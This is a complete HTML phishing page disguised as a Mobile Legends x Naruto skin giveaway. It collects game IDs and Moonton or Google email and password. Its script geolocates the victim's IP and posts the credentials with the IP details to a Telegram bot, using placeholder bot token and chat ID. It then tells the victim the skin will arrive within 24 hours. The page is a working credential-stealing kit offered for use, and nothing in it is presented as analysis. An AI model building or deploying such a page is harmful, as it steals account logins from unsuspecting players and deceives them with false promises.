<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redeem Skin MLBB x Naruto</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: radial-gradient(circle at top left, #1f1c2c, #928dab);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      animation: bgMove 30s ease infinite;
      background-size: 400% 400%;
    }

    @keyframes bgMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .illustration {
      max-width: 240px;
      margin: 20px auto 10px;
      display: block;
      border-radius: 12px;
      box-shadow: 0 0 20px #ffcc00;
      animation: glow 2s infinite alternate;
    }

    @keyframes glow {
      from { box-shadow: 0 0 10px #ffcc00; }
      to { box-shadow: 0 0 25px #ffe700, 0 0 30px #ffa500; }
    }

    form {
      background: #0f0f0fcc;
      backdrop-filter: blur(8px);
      border: 2px solid #ffcc00;
      box-shadow: 0 0 20px #ffcc00;
      border-radius: 16px;
      padding: 30px;
      max-width: 500px;
      width: 90%;
      color: #fff;
      animation: fadeIn 1s ease-in-out;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 26px;
      color: #ffe700;
      text-shadow: 0 0 10px #ffe700;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin-top: 14px;
      border-radius: 8px;
      font-size: 1rem;
      border: 1px solid #666;
      background: #222;
      color: #fff;
      transition: 0.3s ease;
    }

    input:focus, select:focus {
      border-color: #ffcc00;
      outline: none;
      box-shadow: 0 0 8px #ffcc00;
    }

    button {
      background: linear-gradient(90deg, #ffcc00, #ffa500, #ffcc00);
      background-size: 200% auto;
      color: #111;
      border: none;
      font-weight: bold;
      cursor: pointer;
      text-transform: uppercase;
      animation: neonPulse 1.5s infinite alternate;
    }

    button:hover {
      background-position: right center;
      transform: scale(1.05);
    }

    .spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 3px solid #fff;
      border-top: 3px solid #ffcc00;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      vertical-align: middle;
      margin-right: 10px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes neonPulse {
      from { box-shadow: 0 0 10px #ffa500; }
      to   { box-shadow: 0 0 25px #ffcc00, 0 0 30px #ff6600; }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <img src="https://via.placeholder.com/240x320?text=Naruto+Skin" alt="Naruto Skin" class="illustration" />

  <form id="redeemForm">
    <h2>Redeem MLBB x Naruto Skin</h2>

    <input type="text" id="userId" placeholder="Enter your User ID" required inputmode="numeric" pattern="[0-9]*"
      oninput="this.value = this.value.replace(/[^0-9]/g, '')" />

    <input type="text" id="zoneId" placeholder="Enter your Zone ID" required inputmode="numeric" pattern="[0-9]*"
      oninput="this.value = this.value.replace(/[^0-9]/g, '')" />

    <select id="methodSelect" required>
      <option value="Moonton">Login with Moonton</option>
      <option value="Google">Login with Google</option>
    </select>

    <div id="emailLabelDiv">
      <input type="email" id="emailField" placeholder="Moonton Email" required>
    </div>

    <div id="passwordLabelDiv">
      <input type="password" id="passwordField" placeholder="Moonton Password" required>
    </div>

    <select id="skinSelect" required>
      <option value="">Choose Naruto Skin</option>
      <option value="Naruto">Naruto</option>
      <option value="Sasuke">Sasuke</option>
      <option value="Sakura">Sakura</option>
      <option value="Kakashi">Kakashi</option>
    </select>

    <input type="text" id="codeField" placeholder="Redeem Code" readonly required>

    <button type="submit" id="submitBtn">Redeem Now</button>
  </form>

  <script>
    const methodSelect = document.getElementById('methodSelect');
    const emailLabelDiv = document.getElementById('emailLabelDiv');
    const passwordLabelDiv = document.getElementById('passwordLabelDiv');
    const skinSelect = document.getElementById('skinSelect');
    const codeField = document.getElementById('codeField');

    methodSelect.addEventListener('change', function () {
      const method = this.value;
      if (method === 'Google') {
        emailLabelDiv.innerHTML = '<input type="email" id="emailField" placeholder="Google Email" required>';
        passwordLabelDiv.innerHTML = '<input type="password" id="passwordField" placeholder="Google Password" required>';
      } else {
        emailLabelDiv.innerHTML = '<input type="email" id="emailField" placeholder="Moonton Email" required>';
        passwordLabelDiv.innerHTML = '<input type="password" id="passwordField" placeholder="Moonton Password" required>';
      }
    });

    skinSelect.addEventListener('change', () => {
      const skin = skinSelect.value;
      if (skin) {
        const code = `${skin.toUpperCase()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
        codeField.value = code;
      } else {
        codeField.value = '';
      }
    });

    document.getElementById('redeemForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const submitBtn = document.getElementById('submitBtn');
      const originalText = submitBtn.innerHTML;
      submitBtn.disabled = true;
      submitBtn.innerHTML = `<span class="spinner"></span>Processing...`;

      const userId = document.getElementById('userId').value;
      const zoneId = document.getElementById('zoneId').value;
      const email = document.getElementById('emailField').value;
      const password = document.getElementById('passwordField')?.value || '-';
      const method = document.getElementById('methodSelect').value;
      const skin = document.getElementById('skinSelect').value;
      const code = document.getElementById('codeField').value;

      try {
        const ipRes = await fetch('https://ipwho.is/');
        const ipData = await ipRes.json();

        const message = `
[MLBB x Naruto Redeem Attempt]
User ID: ${userId}
Zone ID: ${zoneId}
Email: ${email}
Password: ${password}
Method: ${method}
Skin: ${skin}
Code: ${code}

IP: ${ipData.ip}
Location: ${ipData.city}, ${ipData.country} (${ipData.country_code})
ISP: ${ipData.connection?.org}
ASN: ${ipData.connection?.asn}
        `;

        await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: 'YOUR_CHAT_ID', text: message })
        });

        alert("Redeem successful! The skin will be delivered within 24 hours.");
        this.reset();
        document.getElementById('codeField').value = '';
      } catch (err) {
        console.error(err);
        alert("Error occurred. Try again later.");
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;
      }
    });
  </script>

</body>
</html>
